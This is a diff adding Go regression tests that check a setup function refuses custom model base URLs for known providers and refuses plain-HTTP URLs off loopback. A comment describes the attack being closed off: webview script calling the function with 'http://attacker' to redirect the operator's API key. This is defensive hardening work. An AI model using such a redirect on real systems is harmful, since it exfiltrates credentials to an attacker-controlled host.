@@ -412,3 +412,35 @@ func TestListModelsUsesTheTypedKeyElseTheKeychains(t *testing.T) {
 		t.Fatalf("error: %v", err)
 	}
 }
+
+// A base URL repoints the model call — the operator's key goes wherever it
+// says, and the agent's only egress becomes that host. The page shows the
+// field for the custom provider only; Go used to enforce nothing, so script
+// in the webview could call ApplySetup("anthropic", …, "http://attacker")
+// (security review 2026-09-20 §8.4, C14; D-030).
+func TestApplySetupRefusesABaseURLForAKnownProvider(t *testing.T) {
+	isolateRunEnv(t)
+	withFakeDocker(t, readyImagesFake())
+	for _, provider := range []string{"anthropic", "openai", ""} {
+		err := ApplySetup(context.Background(), SetupOpts{Provider: provider, BaseURL: "https://models.example"}, &strings.Builder{})
+		if err == nil || !strings.Contains(err.Error(), "custom") {
+			t.Fatalf("provider %q with a base URL: err = %v, want a refusal naming the custom provider", provider, err)
+		}
+	}
+}
+
+func TestApplySetupRefusesPlainHTTPOffLoopback(t *testing.T) {
+	isolateRunEnv(t)
+	withFakeDocker(t, readyImagesFake())
+	for _, u := range []string{"http://models.example", "http://10.0.0.5:8000/v1", "ftp://models.example", "models.example"} {
+		err := ApplySetup(context.Background(), SetupOpts{Provider: "custom", BaseURL: u}, &strings.Builder{})
+		if err == nil {
+			t.Fatalf("base URL %q accepted", u)
+		}
+	}
+	for _, u := range []string{"https://models.example/v1", "http://localhost:11434/v1", "http://127.0.0.1:8000"} {
+		if err := ApplySetup(context.Background(), SetupOpts{Provider: "custom", Model: "m", BaseURL: u}, &strings.Builder{}); err != nil {
+			t.Fatalf("base URL %q refused: %v", u, err)
+		}
+	}
+}
